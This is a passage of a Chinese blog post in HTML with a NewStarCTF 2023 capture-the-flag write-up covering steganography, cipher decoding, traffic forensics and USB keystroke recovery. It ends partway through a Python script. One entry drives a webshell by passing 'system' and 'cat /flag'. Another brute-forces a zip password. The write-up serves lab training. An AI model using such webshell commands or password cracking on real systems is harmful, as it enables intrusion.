@@ -1,0 +1,849 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#447EA5">
+  <meta name="author" content="yfz-ikun604">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="newstarctf2023_misc_wp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="newstarctf2023_misc">
+<meta property="og:url" content="http://ikun604.github.io/2023/11/19/newstar2023-misc/index.html">
+<meta property="og:site_name" content="一个真正的鳗">
+<meta property="og:description" content="newstarctf2023_misc_wp">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://ikun604.github.io/2023/11/19/newstar2023-misc/image-20230930170305419.png">
+<meta property="og:image" content="http://ikun604.github.io/2023/11/19/newstar2023-misc/image-20230930170423055.png">
+<meta property="og:image" content="http://ikun604.github.io/2023/11/19/newstar2023-misc/image-20230930233744875.png">
+<meta property="og:image" content="http://ikun604.github.io/2023/11/19/newstar2023-misc/image-20230930233833163.png">
+<meta property="og:image" content="http://ikun604.github.io/2023/11/19/newstar2023-misc/image-20230930233923254.png">
+<meta property="og:image" content="http://ikun604.github.io/2023/11/19/newstar2023-misc/image-20230930125431540.png">
+<meta property="og:image" content="http://ikun604.github.io/2023/11/19/newstar2023-misc/image-20230930125635637.png">
+<meta property="og:image" content="http://ikun604.github.io/2023/11/19/newstar2023-misc/image-20231022214352118.png">
+<meta property="og:image" content="http://ikun604.github.io/2023/11/19/newstar2023-misc/image-20231022214428319.png">
+<meta property="og:image" content="http://ikun604.github.io/2023/11/19/newstar2023-misc/image-20231028004805493.png">
+<meta property="article:published_time" content="2023-11-18T17:09:24.000Z">
+<meta property="article:modified_time" content="2023-11-30T03:25:03.812Z">
+<meta property="article:author" content="yfz-ikun604">
+<meta property="article:tag" content="misc">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://ikun604.github.io/2023/11/19/newstar2023-misc/image-20230930170305419.png">
+  
+  
+  
+  <title>newstarctf2023_misc - 一个真正的鳗</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"ikun604.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('https://static.zkqiang.cn/example.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="newstarctf2023_misc"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-11-19 01:09" pubdate>
+          2023年11月19日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          12k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          97 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">newstarctf2023_misc</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="NewStarCTF-2023-MISC-WP"><a href="#NewStarCTF-2023-MISC-WP" class="headerlink" title="NewStarCTF_2023_MISC_WP"></a>NewStarCTF_2023_MISC_WP</h1><h2 id="WEEK1"><a href="#WEEK1" class="headerlink" title="WEEK1"></a>WEEK1</h2><h3 id="misc-CyberChef’s-Secret"><a href="#misc-CyberChef’s-Secret" class="headerlink" title="misc-CyberChef’s Secret"></a>misc-CyberChef’s Secret</h3><p>搜索标题，找到一个在线解密网站</p>
+<p>直接梭哈</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">https:</span>//www.ddosi<span class="hljs-meta">.org</span>/<br></code></pre></td></tr></table></figure>
+
+<h3 id="misc-空白格"><a href="#misc-空白格" class="headerlink" title="misc-空白格"></a>misc-空白格</h3><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs haxe">由空格等不可见字符组成的隐写<span class="hljs-literal">_</span>部分<br>这里的不可见字符是由空格，制表符，回车组成的信息<br></code></pre></td></tr></table></figure>
+
+<p>White_space</p>
+<p>white_space是一种编程语言</p>
+<p>由“空格”，“回车”，“tab”组成</p>
+<p>在线解码：<a target="_blank" rel="noopener" href="https://vii5ard.github.io/whitespace/">Whitelips the Whitespace IDE (vii5ard.github.io)</a></p>
+<p>将文本丢进去即可</p>
+<h3 id="misc-流量！鲨鱼！"><a href="#misc-流量！鲨鱼！" class="headerlink" title="misc-流量！鲨鱼！"></a>misc-流量！鲨鱼！</h3><p>wireshark分析</p>
+<p>利用http.response.code&#x3D;&#x3D;200过滤</p>
+<p>在某条记录里面发现base64编码的数据，解码两次，即可得到flag</p>
+<h3 id="misc-机密图片"><a href="#misc-机密图片" class="headerlink" title="misc-机密图片"></a>misc-机密图片</h3><p>打开题目，是一张图片，图片是二维码</p>
+<p>扫描二维码，并没有发现</p>
+<p>尝试了好几种方法</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">1</span>.binwalk分离，发现zlib文件，<span class="hljs-number">010</span>查看，发现图片的文件尾，新建文件，加上文件头，还是查看不了<br><span class="hljs-number">2</span>.fo<span class="hljs-comment">remost分离，并没有分离出什么有用的东西</span><br><span class="hljs-number">3</span>.stegslove查看，但是也没看出什么<br></code></pre></td></tr></table></figure>
+
+<p>问了9c神</p>
+<img src="/2023/11/19/newstar2023-misc/image-20230930170305419.png" srcset="/img/loading.gif" lazyload class title="image-20230930170305419">
+
+<p>找到对应的图片，利用Analyse里的Data extract功能，即可获得flag</p>
+<img src="/2023/11/19/newstar2023-misc/image-20230930170423055.png" srcset="/img/loading.gif" lazyload class title="image-20230930170423055">
+
+<h3 id="misc-压缩包们"><a href="#misc-压缩包们" class="headerlink" title="misc-压缩包们"></a>misc-压缩包们</h3><p>本次misc最难一道了(个人感觉</p>
+<p>首先得到一个没有后缀的文件</p>
+<p>先用010一直看，看个不停，只发现了一串base64编码</p>
+<p>解码得到一句话</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">I like six-<span class="hljs-keyword">digit </span>numbers <span class="hljs-keyword">because </span>they are very concise <span class="hljs-keyword">and </span>easy to remember.<br></code></pre></td></tr></table></figure>
+
+<p>可知压缩包有6位数密码</p>
+<p>由标题可知，是压缩包，将文件头改为50 4B 03 04</p>
+<p>然后把flag.zip解压出来</p>
+<img src="/2023/11/19/newstar2023-misc/image-20230930233744875.png" srcset="/img/loading.gif" lazyload class title="image-20230930233744875">
+
+
+
+<p>把加密位改回去</p>
+<img src="/2023/11/19/newstar2023-misc/image-20230930233833163.png" srcset="/img/loading.gif" lazyload class title="image-20230930233833163">
+
+<p>然后ARCHPR爆破</p>
+<img src="/2023/11/19/newstar2023-misc/image-20230930233923254.png" srcset="/img/loading.gif" lazyload class title="image-20230930233923254">
+
+<p>得到密码，打开即可获得flag</p>
+<h3 id="crypto-brainfuck"><a href="#crypto-brainfuck" class="headerlink" title="crypto-brainfuck"></a>crypto-brainfuck</h3><p>brainfuck在线解密即可</p>
+<h3 id="crypto-Caesasr’s-Secret"><a href="#crypto-Caesasr’s-Secret" class="headerlink" title="crypto-Caesasr’s Secret"></a>crypto-Caesasr’s Secret</h3><img src="/2023/11/19/newstar2023-misc/image-20230930125431540.png" srcset="/img/loading.gif" lazyload class title="image-20230930125431540">
+
+<h3 id="crypto-栅栏密码"><a href="#crypto-栅栏密码" class="headerlink" title="crypto-栅栏密码"></a>crypto-栅栏密码</h3><img src="/2023/11/19/newstar2023-misc/image-20230930125635637.png" srcset="/img/loading.gif" lazyload class title="image-20230930125635637">
+
+<p>解题网站:<a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/zhalanmima.php">栅栏密码在线加密解密 - 千千秀字 (qqxiuzi.cn)</a></p>
+<h3 id="crypto-Vigenere"><a href="#crypto-Vigenere" class="headerlink" title="crypto-Vigenère"></a>crypto-Vigenère</h3><p>搜去年NewStarCTF week1的crypto wp，搜到相似的题目，发现密钥是kfc，找个网站解码，还真是</p>
+<p><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/weijiniyamima.php">维吉尼亚密码在线加密解密 - 千千秀字 (qqxiuzi.cn)</a></p>
+<p><a target="_blank" rel="noopener" href="https://guballa.de/vigenere-solver">Vigenere Solver | guballa.de</a></p>
+<h3 id="crypto-babyencoding"><a href="#crypto-babyencoding" class="headerlink" title="crypto-babyencoding"></a>crypto-babyencoding</h3><p>附上一个工具网站:</p>
+<p><a target="_blank" rel="noopener" href="http://www.hiencode.com/">CTF在线工具-CTF工具|CTF编码|CTF密码学|CTF加解密|程序员工具|在线编解码 (hiencode.com)</a></p>
+<p>第一个base64，第二个base32，第三个UUencode</p>
+<p>前两个可以直接用cyber解码，最后一个用上面的网站即可</p>
+<h2 id="WEEK2"><a href="#WEEK2" class="headerlink" title="WEEK2"></a>WEEK2</h2><h3 id="misc-新建空白文档"><a href="#misc-新建空白文档" class="headerlink" title="misc-新建空白文档"></a>misc-新建空白文档</h3><p>word隐藏+新与佛论禅解码</p>
+<h3 id="misc-永不消逝的电波"><a href="#misc-永不消逝的电波" class="headerlink" title="misc-永不消逝的电波"></a>misc-永不消逝的电波</h3><p>音频分析+摩斯解码</p>
+<h3 id="misc-base！"><a href="#misc-base！" class="headerlink" title="misc-base！"></a>misc-base！</h3><p>base64隐写</p>
+<h3 id="misc-jvav（学习）"><a href="#misc-jvav（学习）" class="headerlink" title="misc-jvav（学习）"></a>misc-jvav（学习）</h3><p>java盲水印</p>
+<h3 id="misc-webshell（学习）"><a href="#misc-webshell（学习）" class="headerlink" title="misc-webshell（学习）"></a>misc-webshell（学习）</h3><p>解码之后就不会了</p>
+<p>看完wp，发现是get传system</p>
+<p>post传cat &#x2F;flag</p>
+<h2 id="WEEK3"><a href="#WEEK3" class="headerlink" title="WEEK3"></a>WEEK3</h2><h3 id="misc-阳光开朗大男孩"><a href="#misc-阳光开朗大男孩" class="headerlink" title="misc-阳光开朗大男孩"></a>misc-阳光开朗大男孩</h3><p>两个文件，一个flag.txt，一个secret.txt</p>
+<p>secret.txt是社会主义核心价值观编码</p>
+<p>解码之后是this_password_is_<strong>s000_h4rd_p4sssw0rdddd</strong>，这部分是密码</p>
+<p>然后emoji解码</p>
+<p>解密网站:</p>
+<p><a target="_blank" rel="noopener" href="https://aghorler.github.io/emoji-aes/">emoji-aes (aghorler.github.io)</a></p>
+<h3 id="misc-大怨种"><a href="#misc-大怨种" class="headerlink" title="misc-大怨种"></a>misc-大怨种</h3><p>stegsolve丁帧</p>
+<p>然后扫码</p>
+<p><strong>汉信码</strong></p>
+<h3 id="misc-2-分析-学习"><a href="#misc-2-分析-学习" class="headerlink" title="misc-2-分析(学习)"></a>misc-2-分析(学习)</h3><p><del>这道题其实跟我的猜想一样，我好像记得我交过flag的？好像不对？算了</del></p>
+<p><strong>考点</strong>：HTTP流量分析、简单溯源</p>
+<p>Flag由三个信息构成：登录用户名、存在漏洞的文件名、写入的WebShell文件名。</p>
+<p>根据我们的常识，一般登录请求都是POST方式的请求，因此可以先过滤出所有的POST请求：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">http &amp;&amp; http<span class="hljs-selector-class">.request</span><span class="hljs-selector-class">.method</span> == POST<br></code></pre></td></tr></table></figure>
+
+<p>其次是存在漏洞的文件名和WebShell文件名，可以看到有大量的目录扫描流量，先使用WireShark过滤器过滤掉响应状态码为404的响应：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">http &amp;&amp; http<span class="hljs-selector-class">.response</span><span class="hljs-selector-class">.code</span> != <span class="hljs-number">404</span><br></code></pre></td></tr></table></figure>
+
+<p>对剩下的流量进行分析，关注到1267号流量响应比较奇怪：</p>
+<img src="/2023/11/19/newstar2023-misc/image-20231022214352118.png" srcset="/img/loading.gif" lazyload class title="image-20231022214352118">
+
+<p>右键点击那个流量</p>
+<img src="/2023/11/19/newstar2023-misc/image-20231022214428319.png" srcset="/img/loading.gif" lazyload class title="image-20231022214428319">
+
+<p>溯源</p>
+<p>于是找到index.php存在漏洞，并且写入了wh1t3g0d.php这个Shell，结束</p>
+<h3 id="misc-键盘侠（学习）"><a href="#misc-键盘侠（学习）" class="headerlink" title="misc-键盘侠（学习）"></a>misc-键盘侠（学习）</h3><p>摘自官方wp:</p>
+<p>打开题目发现是USB流量，结合题目名猜测是键盘流量，使用WireShark过滤器过滤出所有的键盘流量，然后导出保存为res.pcapng：</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">usb.src <span class="hljs-operator">=</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;1.15.1&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>使用tshark命令对流量数据进行提取并去除空行：</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">tshark</span> -r res.pcapng -T fields -e usb.capdata | sed <span class="hljs-string">&#x27;/^\s*$/d&#x27;</span> &gt; usbdata.txt<br></code></pre></td></tr></table></figure>
+
+<p>exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python">normalKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;9&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;=&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;[&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br><br>shiftKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;Z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;^&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;(&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;)&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span 